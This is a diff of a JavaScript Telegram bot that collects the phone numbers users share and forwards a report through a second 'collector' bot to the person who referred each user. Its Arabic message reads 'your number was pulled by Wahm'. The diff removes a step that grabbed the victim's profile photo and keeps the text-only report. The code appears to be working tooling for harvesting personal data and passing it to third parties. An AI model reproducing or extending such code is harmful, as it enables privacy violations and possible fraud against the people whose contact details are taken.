@@ -88,18 +88,6 @@ bot.on('contact', async (msg) => {
 
     const targetOwnerId = userReferrerMap[chatId];
 
-    let profilePhotoUrl = "";
-    try {
-        const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
-        if (photos && photos.total_count > 0) {
-            const fileId = photos.photos[0][0].file_id;
-            const file = await bot.getFile(fileId);
-            profilePhotoUrl = `https://api.telegram.org/file/bot${COLLECTOR_TOKEN}/${file.file_path}`;
-        }
-    } catch (e) {
-        console.log("تعذر جلب صورة الحساب:", e.message);
-    }
-
     const whatsappMessage = encodeURIComponent("تم سحب رقمك بواسطة وهم");
     const whatsappLink = `https://wa.me/${phone}?text=${whatsappMessage}`;
 
@@ -121,17 +109,11 @@ bot.on('contact', async (msg) => {
 
     if (targetOwnerId) {
         try {
-            if (profilePhotoUrl) {
-                await notifierBot.sendPhoto(targetOwnerId, profilePhotoUrl, {
-                    caption: reportMessage,
-                    parse_mode: "Markdown"
-                });
-            } else {
-                await notifierBot.sendMessage(targetOwnerId, reportMessage, {
-                    parse_mode: "Markdown"
-                });
-            }
-            console.log(`تم إرسال التقرير بنجاح إلى الأيدي: ${targetOwnerId}`);
+            // إرسال النص فقط لتجنب أي مشاكل في صيغة الصور أو روابط الملفات
+            await notifierBot.sendMessage(targetOwnerId, reportMessage, {
+                parse_mode: "Markdown"
+            });
+            console.log(`تم إرسال التقرير النصي بنجاح إلى الأيدي: ${targetOwnerId}`);
         } catch (err) {
             console.log("خطأ أثناء إرسال البيانات للبوت الثاني:", err.message);
         }
